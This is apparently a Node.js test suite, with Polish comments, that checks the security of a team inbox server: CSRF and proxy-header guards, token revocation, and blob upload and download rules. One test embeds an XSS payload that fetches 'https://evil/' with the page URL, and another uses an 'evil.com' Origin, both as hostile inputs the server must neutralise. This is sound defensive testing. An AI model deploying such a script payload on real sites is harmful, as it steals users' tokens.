const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const { spawn } = require('node:child_process');
const http = require('node:http');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

// Testy HTTP huba Team OS (/inbox/v1/:token/* + prywatne /api/inbox/members) na ŻYWYM
// procesie serwera (wzorzec server.env.test.js / ask.http.test.js): server.js startuje
// DB/scheduler przy require, więc driver przez spawn + fetch omija te side-effecty w runnerze.
// config.js czyta env RAZ przy starcie procesu, dlatego izolowane bazy (CLAUDE_CRON_DB_PATH +
// CLAUDE_CRON_INBOX_DB_PATH → tmp; test PISZE członków/wiadomości, nie może dotknąć realnych
// baz usera) i WEBHOOK_BASE_URL (źródło Funnel-URL kodu zaproszenia) wchodzą przy SPAWNIE.

const PORT = 7801;
const FUNNEL_URL = 'https://test-hub.tail1234.ts.net';

let tmpDir;
let server;

const url = (p) => `http://localhost:${PORT}${p}`;

function waitForServerReady(proc) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error('Serwer nie wystartował w 10s')), 10000);
    proc.stdout.on('data', (chunk) => {
      if (chunk.toString().includes('Puls running')) {
        clearTimeout(timer);
        resolve();
      }
    });
    proc.on('error', (err) => {
      clearTimeout(timer);
      reject(err);
    });
  });
}

// Utworzenie członka przez prywatne API (localhost bez XFF = dozwolone). Zwraca pełny
// token — potrzebny testom do wołania publicznych endpointów tokenowych.
async function createMember(name) {
  const res = await fetch(url('/api/inbox/members'), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name }),
  });
  assert.equal(res.status, 201, `utworzenie członka "${name}" zwróciło ${res.status}`);
  return res.json();
}

// Wywołanie publicznego tokenowego endpointu inbox.
function inboxCall(token, action, { method = 'POST', body, xff } = {}) {
  const headers = {};
  if (body !== undefined) headers['Content-Type'] = 'application/json';
  if (xff) headers['X-Forwarded-For'] = xff;
  return fetch(url(`/inbox/v1/${token}/${action}`), {
    method,
    headers,
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
}

before(async () => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'inbox-http-'));
  server = spawn('node', [path.join(__dirname, 'server.js')], {
    env: {
      ...process.env,
      CLAUDE_CRON_PORT: String(PORT),
      CLAUDE_CRON_DB_PATH: path.join(tmpDir, 'claude-cron.db'),
      CLAUDE_CRON_INBOX_DB_PATH: path.join(tmpDir, 'inbox.db'),
      // Test PISZE bajty załączników — magazyn też musi być tymczasowy.
      CLAUDE_CRON_INBOX_BLOBS_DIR: path.join(tmpDir, 'inbox-blobs'),
      WEBHOOK_BASE_URL: FUNNEL_URL,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  await waitForServerReady(server);
  // Ta sama baza co spawnowany serwer — połączenie fixture'owe testu.
  inboxDb.setInboxDbPath(path.join(tmpDir, 'inbox.db'));
});

after(() => {
  inboxDb.close();
  if (server) server.kill('SIGKILL');
  if (tmpDir) fs.rmSync(tmpDir, { recursive: true, force: true });
});

test('POST /api/inbox/members zwraca pełny token + kod zaproszenia jednorazowo; GET maskuje', async () => {
  // Act — utworzenie
  const created = await createMember('Ala');

  // Assert — pełny token (64-znakowy hex) i gotowy kod zaproszenia TYLKO w odpowiedzi POST
  assert.match(created.token, /^[0-9a-f]{64}$/, 'pełny token to hex z randomBytes(32)');
  assert.equal(created.name, 'Ala');
  assert.equal(created.invite_code, `puls-inbox:${FUNNEL_URL}#${created.token}`);

  // Assert — GET zwraca WYŁĄCZNIE maskę (ostatnie 4 znaki), nigdy pełnego tokenu
  const listRes = await fetch(url('/api/inbox/members'));
  assert.equal(listRes.status, 200);
  const members = await listRes.json();
  const ala = members.find((m) => m.name === 'Ala');
  assert.ok(ala, 'Ala jest na liście członków');
  assert.equal(ala.token_masked, `…${created.token.slice(-4)}`);
  assert.ok(!('token' in ala), 'GET nie zwraca pełnego tokenu w żadnym polu');
  assert.ok(!('invite_code' in ala), 'GET nie zwraca kodu zaproszenia');
});

test('kolejność matcherów: /inbox/v1/:token/ping działa z X-Forwarded-For, /api/inbox/members z XFF → 403', async () => {
  // Arrange
  const member = await createMember('Funnelowy');

  // Act + Assert — inbox jest publiczny: ruch z Funnela (XFF) MUSI przejść
  const pingRes = await inboxCall(member.token, 'ping', { method: 'GET', xff: '203.0.113.9' });
  assert.equal(pingRes.status, 200, 'ping przez Funnel przechodzi (matcher przed guardem XFF)');
  const ping = await pingRes.json();
  assert.equal(ping.v, 1);
  assert.equal(ping.user, 'Funnelowy', 'hub wyprowadza tożsamość z tokenu');
  assert.equal(ping.hub, 'puls');

  // Act + Assert — prywatne API administracyjne jest ZA guardem: XFF = 403
  const adminRes = await fetch(url('/api/inbox/members'), { headers: { 'X-Forwarded-For': '203.0.113.9' } });
  assert.equal(adminRes.status, 403, 'guard XFF chroni /api/inbox/members przed Funnelem');
});

test('idempotencja done przez HTTP: powtórzony done → already_done, bez duplikatu reply', async () => {
  // Arrange — Sender wysyła task do Receivera
  const sender = await createMember('Sender');
  const receiver = await createMember('Receiver');
  const sendRes = await inboxCall(sender.token, 'send', {
    body: { to_user: 'Receiver', type: 'task', title: 'Zrób raport' },
  });
  assert.equal(sendRes.status, 200);

  // Receiver pobiera, znajduje id taska
  const pull1 = await (await inboxCall(receiver.token, 'pull')).json();
  const task = pull1.active.find((m) => m.type === 'task' && m.title === 'Zrób raport');
  assert.ok(task, 'task dotarł do Receivera');

  // Act — pierwszy done → replied
  const done1 = await (await inboxCall(receiver.token, 'done', { body: { id: task.id, action: 'Zrobione' } })).json();
  assert.equal(done1.result, 'replied', 'pierwszy done na tasku tworzy reply i zamyka');

  // Act — powtórzony done na TYM SAMYM rekordzie → already_done (re-read statusu z DB)
  const done2 = await (await inboxCall(receiver.token, 'done', { body: { id: task.id, action: 'Zrobione' } })).json();
  assert.equal(done2.result, 'already_done', 'drugi done to no-op, zero skutków ubocznych');

  // Assert — BRAK duplikatu wiersza reply: Sender widzi dokładnie JEDEN reply w wątku
  const pullSender = await (await inboxCall(sender.token, 'pull')).json();
  const repliesInThread = pullSender.threadRows.filter(
    (m) => m.thread_id === task.thread_id && m.type === 'reply'
  );
  assert.equal(repliesInThread.length, 1, 'dokładnie jeden reply mimo dwóch done (idempotencja)');
});

test('granica JSON przez pełny stos: pull zwraca payload.auto_reply jako BOOLEAN true, nie string', async () => {
  // Arrange — wiadomość z payloadem zawierającym auto_reply: true (boolean)
  const sender = await createMember('AutoSender');
  const receiver = await createMember('AutoReceiver');
  const sendRes = await inboxCall(sender.token, 'send', {
    body: {
      to_user: 'AutoReceiver',
      type: 'task',
      title: 'Sprawdź coś',
      payload: { auto_reply: true },
    },
  });
  assert.equal(sendRes.status, 200);

  // Act — Receiver pobiera przez HTTP (send serializuje, pull deserializuje — cały stos)
  const pull = await (await inboxCall(receiver.token, 'pull')).json();
  const msg = pull.active.find((m) => m.title === 'Sprawdź coś');
  assert.ok(msg, 'wiadomość dotarła');

  // Assert — payload jest OBIEKTEM, a auto_reply BOOLEANEM (nie string "true")
  assert.equal(typeof msg.payload, 'object');
  assert.equal(typeof msg.payload.auto_reply, 'boolean', 'auto_reply przeżył granicę JSON jako boolean');
  assert.equal(msg.payload.auto_reply, true);
});

test('DELETE /api/inbox/members/:id odwołuje członka; jego token przestaje działać', async () => {
  // Arrange
  const member = await createMember('DoUsuniecia');
  // token działa przed odwołaniem
  assert.equal((await inboxCall(member.token, 'ping', { method: 'GET' })).status, 200);

  // Act — odwołanie
  const delRes = await fetch(url(`/api/inbox/members/${member.id}`), { method: 'DELETE' });
  assert.equal(delRes.status, 200);
  assert.deepEqual(await delRes.json(), { ok: true });

  // Assert — odwołany token to teraz intruz (403 bez treści)
  assert.equal((await inboxCall(member.token, 'ping', { method: 'GET' })).status, 403);
  // Powtórny DELETE nieistniejącego → 404
  assert.equal((await fetch(url(`/api/inbox/members/${member.id}`), { method: 'DELETE' })).status, 404);
});

test('CSRF: POST /api/inbox/members z obcym Origin → 403, członek NIE powstaje (token nie wycieka)', async () => {
  // Arrange — liczba członków przed próbą ataku
  const before = (await (await fetch(url('/api/inbox/members'))).json()).length;

  // Act — strona z evil.com robi cross-origin POST do lokalnego Pulsa (bez XFF przechodzi
  // guard, ale Origin ≠ Host). Musi zostać odrzucony PRZED utworzeniem członka.
  const attack = await fetch(url('/api/inbox/members'), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Origin: 'https://evil.com' },
    body: JSON.stringify({ name: 'Napastnik' }),
  });

  // Assert — 403 i BRAK tokenu w odpowiedzi
  assert.equal(attack.status, 403, 'cross-origin POST odrzucony');
  const attackBody = await attack.json();
  assert.ok(!('token' in attackBody), 'odpowiedź nie zawiera tokenu');
  assert.ok(!('invite_code' in attackBody), 'odpowiedź nie zawiera kodu zaproszenia');

  // Assert — żaden członek nie powstał (side-effect zablokowany, nie tylko odczyt)
  const after = (await (await fetch(url('/api/inbox/members'))).json()).length;
  assert.equal(after, before, 'liczba członków bez zmian — mutacja zablokowana');
});

test('CSRF: same-origin POST (Origin == Host) przechodzi — dashboard nie jest zablokowany', async () => {
  // Act — legalny dashboard jest same-origin: Origin pokrywa się z Host
  const res = await fetch(url('/api/inbox/members'), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Origin: `http://localhost:${PORT}` },
    body: JSON.stringify({ name: 'SameOrigin' }),
  });

  // Assert — utworzenie działa jak zwykle
  assert.equal(res.status, 201, 'same-origin mutacja przechodzi');
  const body = await res.json();
  assert.equal(body.name, 'SameOrigin');
});

test('POST /api/inbox/members z duplikatem imienia → 409; bez name → 400', async () => {
  // Arrange
  await createMember('Unikat');

  // Act + Assert — duplikat name (UNIQUE) mapowany na 409
  const dup = await fetch(url('/api/inbox/members'), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: 'Unikat' }),
  });
  assert.equal(dup.status, 409);

  // Act + Assert — brak name → 400
  const noName = await fetch(url('/api/inbox/members'), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({}),
  });
  assert.equal(noName.status, 400);
});

// ──────── Ścieżka binarna: /inbox/v1/:token/blob/:sha256 ────────

const crypto = require('node:crypto');

// Bezpośredni dostęp do bazy huba WYŁĄCZNIE jako fixture (patrz sendWithAttachment).
const inboxDb = require('./lib/inbox-db');

const sha256Hex = (buf) => crypto.createHash('sha256').update(buf).digest('hex');
const blobUrl = (token, sha) => url(`/inbox/v1/${token}/blob/${sha}`);

// Ile plików leży w magazynie blobów (bez katalogu tmp) — dowód, że zapis NIE nastąpił
// i że po odrzuconym transferze nie został plik tymczasowy.
function blobStoreFiles() {
  const dir = path.join(tmpDir, 'inbox-blobs');
  if (!fs.existsSync(dir)) return [];
  const out = [];
  const walk = (d) => {
    for (const entry of fs.readdirSync(d, { withFileTypes: true })) {
      const full = path.join(d, entry.name);
      if (entry.isDirectory()) walk(full);
      else out.push(full);
    }
  };
  walk(dir);
  return out;
}

// Wiadomość z załącznikiem — nadaje uprawnienie do odczytu bajtów. Wiadomość idzie przez
// HTTP (realna ścieżka), a wiersz metadanych dokłada test WPROST do bazy huba: `send`
// z listą `attachments` powstaje dopiero w IU-5, a tutaj potrzebny jest wyłącznie
// ISTNIEJĄCY wiersz wskazujący na sha256 — to on jest przedmiotem reguły uczestnictwa.
// Zapis z drugiego procesu jest bezpieczny: baza huba chodzi w WAL z busy_timeout.
async function sendWithAttachment(senderToken, toUser, attachment) {
  const res = await fetch(url(`/inbox/v1/${senderToken}/send`), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ to_user: toUser, type: 'task', title: 'Z plikiem' }),
  });
  assert.equal(res.status, 200, 'wiadomość nośnik załącznika powstaje');
  const { message } = await res.json();
  inboxDb.addAttachments(inboxDb.getInboxDb(), message.id, [attachment]);
  return message;
}

test('PUT blob: bajty przechodzą przez pełny stos HTTP i wracają GET-em bit w bit', async () => {
  // Arrange — treść z bajtami spoza ASCII: dowód, że ścieżka binarna NIE przeszła przez
  // readTextBody (setEncoding('utf8') zamieniłby je w U+FFFD i hash by się nie zgodził).
  const sender = await createMember('BlobNadawca');
  const bytes = Buffer.from([0x00, 0xff, 0xfe, 0x42, 0x80, 0x01, 0xc3, 0x28]);
  const sha = sha256Hex(bytes);

  // Act — upload
  const put = await fetch(blobUrl(sender.token, sha), { method: 'PUT', body: bytes });

  // Assert — 200 i metryki transferu
  assert.equal(put.status, 200);
  const body = await put.json();
  assert.equal(body.v, 1);
  assert.equal(body.sha256, sha);
  assert.equal(body.size, bytes.length);
  assert.equal(body.deduped, false, 'pierwszy upload realnie zapisuje bajty');

  // Arrange — uprawnienie do odczytu bierze się z uczestnictwa w wiadomości
  const receiver = await createMember('BlobOdbiorca');
  await sendWithAttachment(sender.token, 'BlobOdbiorca', {
    filename: 'dane.bin',
    size_bytes: bytes.length,
    mime: 'application/octet-stream',
    sha256: sha,
  });

  // Act — pobranie przez adresata
  const get = await fetch(blobUrl(receiver.token, sha));

  // Assert — te same bajty, poprawne nagłówki
  assert.equal(get.status, 200);
  assert.equal(get.headers.get('content-type'), 'application/octet-stream');
  assert.equal(get.headers.get('content-length'), String(bytes.length));
  const downloaded = Buffer.from(await get.arrayBuffer());
  assert.deepEqual(downloaded, bytes, 'bajty przeżyły round-trip bez uszkodzenia');
});

test('PUT blob: powtórzony upload tej samej treści → 200 deduped, jeden plik w magazynie (R4)', async () => {
  // Arrange
  const member = await createMember('BlobDedup');
  const bytes = Buffer.from('dokładnie ta sama treść');
  const sha = sha256Hex(bytes);

  // Act
  const first = await (await fetch(blobUrl(member.token, sha), { method: 'PUT', body: bytes })).json();
  const second = await (await fetch(blobUrl(member.token, sha), { method: 'PUT', body: bytes })).json();

  // Assert — drugi przebieg to sukces BEZ ponownego zapisu (dlatego retry uploadu jest bezpieczny)
  assert.equal(first.deduped, false);
  assert.equal(second.deduped, true);
  assert.equal(second.sha256, sha);
  assert.equal(blobStoreFiles().filter((f) => f.endsWith(sha)).length, 1, 'jedne bajty, nie dwie kopie');
});

test('PUT blob: treść o innym hashu niż w URL → 400, blob nie powstaje', async () => {
  // Arrange — deklaracja nadawcy celowo nie pasuje do treści
  const member = await createMember('BlobKlamca');
  const declared = sha256Hex(Buffer.from('coś zupełnie innego'));

  // Act
  const res = await fetch(blobUrl(member.token, declared), { method: 'PUT', body: Buffer.from('podmieniona treść') });

  // Assert — hub liczy sumę sam; podstawienie treści pod cudzy hash odrzucone
  assert.equal(res.status, 400);
  assert.equal((await res.json()).error, 'hash_mismatch');
  assert.equal(blobStoreFiles().filter((f) => f.endsWith(declared)).length, 0, 'blob nie powstał');
  assert.equal(blobStoreFiles().filter((f) => f.endsWith('.part')).length, 0, 'plik tymczasowy sprzątnięty');
});

test('PUT blob: ciało większe niż limit → 413, plik tymczasowy nie zostaje', async () => {
  // Arrange — 26 MB przy limicie 25 MB
  const member = await createMember('BlobGrubas');
  const tooBig = Buffer.alloc(26 * 1024 * 1024, 7);
  const sha = sha256Hex(tooBig);

  // Act
  const res = await fetch(blobUrl(member.token, sha), { method: 'PUT', body: tooBig });

  // Assert
  assert.equal(res.status, 413);
  assert.equal(blobStoreFiles().filter((f) => f.endsWith(sha)).length, 0, 'bajty odrzucone');
  assert.equal(blobStoreFiles().filter((f) => f.endsWith('.part')).length, 0, 'brak śmiecia po przerwanym transferze');
});

test('PUT blob: nieznany token → 403 bez treści, magazyn nietknięty', async () => {
  // Arrange
  const bytes = Buffer.from('tajne dane intruza');
  const sha = sha256Hex(bytes);

  // Act
  const res = await fetch(blobUrl('token-nieistniejacy', sha), { method: 'PUT', body: bytes });

  // Assert
  assert.equal(res.status, 403);
  assert.equal(await res.text(), '', 'intruz nie dostaje treści diagnostycznej');
  assert.equal(blobStoreFiles().filter((f) => f.endsWith(sha)).length, 0);
});

test('GET blob: członek spoza wiadomości → 404 — sam hash nie jest uprawnieniem', async () => {
  // Arrange — Nadawca wysyła plik do Adresata; Obcy zna hash (wycieka do renderu Skrzynki)
  const sender = await createMember('PrywNadawca');
  await createMember('PrywOdbiorca');
  const obcy = await createMember('PrywObcy');
  const bytes = Buffer.from('poufny raport kwartalny');
  const sha = sha256Hex(bytes);
  assert.equal((await fetch(blobUrl(sender.token, sha), { method: 'PUT', body: bytes })).status, 200);
  await sendWithAttachment(sender.token, 'PrywOdbiorca', {
    filename: 'raport.txt',
    size_bytes: bytes.length,
    mime: 'text/plain',
    sha256: sha,
  });

  // Act — Obcy próbuje pobrać bajty po samym hashu
  const res = await fetch(blobUrl(obcy.token, sha));

  // Assert — 404, nie 403: kod nie zdradza, że bajty są na hubie
  assert.equal(res.status, 404);
  assert.equal(await res.text(), '');

  // Assert — nadawca (strona wiadomości) pobiera te same bajty bez problemu
  const legit = await fetch(blobUrl(sender.token, sha));
  assert.equal(legit.status, 200);
  assert.equal(Buffer.from(await legit.arrayBuffer()).toString(), 'poufny raport kwartalny');
});

test('blob: zła metoda → 405; sha256 spoza wzorca → 400 (ścieżka na dysku nie powstaje)', async () => {
  // Arrange
  const member = await createMember('BlobMetody');
  const sha = sha256Hex(Buffer.from('x'));

  // Act + Assert — POST nie jest metodą binarną
  assert.equal((await fetch(blobUrl(member.token, sha), { method: 'POST', body: 'x' })).status, 405);

  // Act + Assert — parametr spoza [a-f0-9]{64} nigdy nie dociera do path.join
  const bad = await fetch(url(`/inbox/v1/${member.token}/blob/nie-jest-hashem`));
  assert.equal(bad.status, 400);
  assert.equal((await bad.json()).error, 'invalid_sha256');
});

test('blob przez Funnel (X-Forwarded-For) przechodzi — matcher stoi przed guardem XFF', async () => {
  // Arrange
  const member = await createMember('BlobFunnel');
  const bytes = Buffer.from('plik z zewnątrz tailnetu');
  const sha = sha256Hex(bytes);

  // Act — ruch z Funnela niesie XFF; endpoint binarny jest publiczny jak reszta /inbox/v1
  const res = await fetch(blobUrl(member.token, sha), {
    method: 'PUT',
    headers: { 'X-Forwarded-For': '203.0.113.9' },
    body: bytes,
  });

  // Assert
  assert.equal(res.status, 200, 'guard XFF nie może zabić publicznego endpointu binarnego');
  assert.equal((await res.json()).sha256, sha);
});

test('GET blob: mime od nadawcy nie steruje renderem — octet-stream + nosniff + attachment', async () => {
  // Arrange — nadawca deklaruje text/html z treścią wykonywalną w przeglądarce
  const sender = await createMember('MimeNadawca');
  const receiver = await createMember('MimeOdbiorca');
  const bytes = Buffer.from('<script>fetch("https://evil/"+location.href)</script>');
  const sha = sha256Hex(bytes);
  assert.equal((await fetch(blobUrl(sender.token, sha), { method: 'PUT', body: bytes })).status, 200);
  await sendWithAttachment(sender.token, 'MimeOdbiorca', {
    filename: 'zlosliwy.html',
    size_bytes: bytes.length,
    mime: 'text/html',
    sha256: sha,
  });

  // Act
  const res = await fetch(blobUrl(receiver.token, sha));

  // Assert — skrypt nie wykona się na origin huba (a token ofiary siedzi w tym URL-u)
  assert.equal(res.status, 200);
  assert.equal(res.headers.get('content-type'), 'application/octet-stream');
  assert.equal(res.headers.get('x-content-type-options'), 'nosniff');
  assert.equal(res.headers.get('content-disposition'), 'attachment');
});

test('GET blob: image/svg+xml też schodzi do octet-stream (SVG wykonuje skrypt)', async () => {
  // Arrange
  const sender = await createMember('SvgNadawca');
  const receiver = await createMember('SvgOdbiorca');
  const bytes = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>');
  const sha = sha256Hex(bytes);
  assert.equal((await fetch(blobUrl(sender.token, sha), { method: 'PUT', body: bytes })).status, 200);
  await sendWithAttachment(sender.token, 'SvgOdbiorca', {
    filename: 'obrazek.svg',
    size_bytes: bytes.length,
    mime: 'image/svg+xml',
    sha256: sha,
  });

  // Act
  const res = await fetch(blobUrl(receiver.token, sha));

  // Assert
  assert.equal(res.status, 200);
  assert.equal(res.headers.get('content-type'), 'application/octet-stream');
  assert.equal(res.headers.get('x-content-type-options'), 'nosniff');
});

test('GET blob: mime z allowlisty (image/png) zostaje zachowany', async () => {
  // Arrange
  const sender = await createMember('PngNadawca');
  const receiver = await createMember('PngOdbiorca');
  const bytes = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  const sha = sha256Hex(bytes);
  assert.equal((await fetch(blobUrl(sender.token, sha), { method: 'PUT', body: bytes })).status, 200);
  await sendWithAttachment(sender.token, 'PngOdbiorca', {
    filename: 'zrzut.png',
    size_bytes: bytes.length,
    mime: 'image/png',
    sha256: sha,
  });

  // Act
  const res = await fetch(blobUrl(receiver.token, sha));

  // Assert — bezpieczny typ nie jest kaleczony, ale nadal nie renderuje się w miejscu
  assert.equal(res.headers.get('content-type'), 'image/png');
  assert.equal(res.headers.get('content-disposition'), 'attachment');
});

test('GET blob: metadane są, bajtów na dysku nie ma → 404 z pustym ciałem (nie 500)', async () => {
  // Arrange — wiadomość z załącznikiem BEZ uprzedniego PUT-a bajtów (stan po retencji fazy 4)
  const sender = await createMember('SierotaNadawca');
  const receiver = await createMember('SierotaOdbiorca');
  const bytes = Buffer.from('bajty, których na hubie nigdy nie było');
  const sha = sha256Hex(bytes);
  inboxDb.recordBlobUpload(sha, 'SierotaNadawca'); // ślad wgrania został, plik nie
  await sendWithAttachment(sender.token, 'SierotaOdbiorca', {
    filename: 'zgubiony.bin',
    size_bytes: bytes.length,
    mime: 'application/octet-stream',
    sha256: sha,
  });

  // Act
  const res = await fetch(blobUrl(receiver.token, sha));

  // Assert
  assert.equal(res.status, 404);
  assert.equal(await res.text(), '');
});

test('GET blob: wiadomość sfabrykowana do samego siebie z cudzym hashem → 404', async () => {
  // Arrange — Nadawca wgrywa poufny plik i wysyła go Adresatowi
  const sender = await createMember('FabrNadawca');
  await createMember('FabrOdbiorca');
  const obcy = await createMember('FabrObcy');
  const bytes = Buffer.from('poufna umowa');
  const sha = sha256Hex(bytes);
  assert.equal((await fetch(blobUrl(sender.token, sha), { method: 'PUT', body: bytes })).status, 200);
  await sendWithAttachment(sender.token, 'FabrOdbiorca', {
    filename: 'umowa.pdf',
    size_bytes: bytes.length,
    mime: 'application/pdf',
    sha256: sha,
  });

  // Act — Obcy zna hash i pisze wiadomość SAM DO SIEBIE, wskazując cudze bajty
  await sendWithAttachment(obcy.token, 'FabrObcy', {
    filename: 'kradziez.pdf',
    size_bytes: bytes.length,
    mime: 'application/pdf',
    sha256: sha,
  });
  const res = await fetch(blobUrl(obcy.token, sha));

  // Assert — hash nie jest uprawnieniem, nawet z własnym wierszem wiadomości
  assert.equal(res.status, 404);
  assert.equal(await res.text(), '');
});

test('PUT blob: pusty upload cudzych bajtów po samym hashu NIE daje dostępu', async () => {
  // Arrange — Nadawca wgrywa plik, Obcy zna wyłącznie hash
  const sender = await createMember('PustyNadawca');
  const obcy = await createMember('PustyObcy');
  const bytes = Buffer.from('tajny załącznik do wykradzenia');
  const sha = sha256Hex(bytes);
  assert.equal((await fetch(blobUrl(sender.token, sha), { method: 'PUT', body: bytes })).status, 200);

  // Act — Obcy PUT-uje pod tym hashem treść, której nie zna (skrót dedupu jest tylko
  // dla tego, kto te bajty realnie wgrał)
  const put = await fetch(blobUrl(obcy.token, sha), { method: 'PUT', body: Buffer.from('') });

  // Assert — hub liczy sumę sam, więc podszywka pada na hash_mismatch
  assert.equal(put.status, 400);
  assert.equal((await put.json()).error, 'hash_mismatch');

  // Assert — i nie zdobył uprawnienia: wiadomość do siebie samego dalej daje 404
  await sendWithAttachment(obcy.token, 'PustyObcy', {
    filename: 'lup.bin',
    size_bytes: bytes.length,
    mime: 'application/octet-stream',
    sha256: sha,
  });
  assert.equal((await fetch(blobUrl(obcy.token, sha))).status, 404);
});

test('PUT blob: zadeklarowany Content-Length ponad limit → 413 bez transferu ciała', async () => {
  // Arrange
  const member = await createMember('BlobDeklaracja');
  const sha = sha256Hex(Buffer.from('nieistotne'));

  // Act — surowy klient http, bo fetch/undici sam przelicza Content-Length; deklarujemy
  // 26 MB i wysyłamy 16 bajtów, więc odpowiedź może przyjść WYŁĄCZNIE z odmowy przed transferem
  const { status, body } = await new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: 'localhost',
        port: PORT,
        method: 'PUT',
        path: `/inbox/v1/${member.token}/blob/${sha}`,
        headers: { 'Content-Length': String(26 * 1024 * 1024) },
      },
      (res) => {
        let text = '';
        res.on('data', (c) => (text += c));
        res.on('end', () => resolve({ status: res.statusCode, body: text }));
      }
    );
    req.on('error', reject);
    req.write(Buffer.alloc(16));
  });

  // Assert — odmowa PRZED zapisem, kształt odpowiedzi jak z limitu strumieniowego
  assert.equal(status, 413);
  assert.equal(JSON.parse(body).error, 'too_large');
  assert.equal(blobStoreFiles().filter((f) => f.endsWith('.part')).length, 0);
});

test('inbox URL: nadmiarowy segment akcji nietbinarnej nie przechodzi (404)', async () => {
  // Arrange
  const member = await createMember('SegmentyCzlonek');

  // Act + Assert — ta sama operacja pod wieloma URL-ami maskowałaby błąd klienta
  assert.equal((await fetch(url(`/inbox/v1/${member.token}/ping/smiec`))).status, 404);
  const pull = await fetch(url(`/inbox/v1/${member.token}/pull/x`), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: '{}',
  });
  assert.equal(pull.status, 404);
});
